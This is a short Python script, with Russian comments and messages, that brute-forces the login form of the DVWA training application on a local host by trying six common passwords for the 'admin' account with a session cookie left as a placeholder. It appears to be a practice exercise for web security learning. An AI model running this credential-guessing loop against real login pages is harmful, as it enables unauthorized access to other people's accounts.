import requests

url = "http://dvwa.local/vulnerabilities/brute/"
username = "admin"

passwords = [
    "123456",
    "password",
    "admin",
    "qwerty",
    "letmein",
    "password123"
]

cookies = {
    "security": "low",
    "PHPSESSID": "ВСТАВЬ_СЮДА_СВОЙ_PHPSESSID"
}

for password in passwords:
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    r = requests.get(url, params=params, cookies=cookies)

    if "Welcome to the password protected area" in r.text:
        print(f"[+] Пароль найден: {password}")
        break
    else:
        print(f"[-] Неверный пароль: {password}")


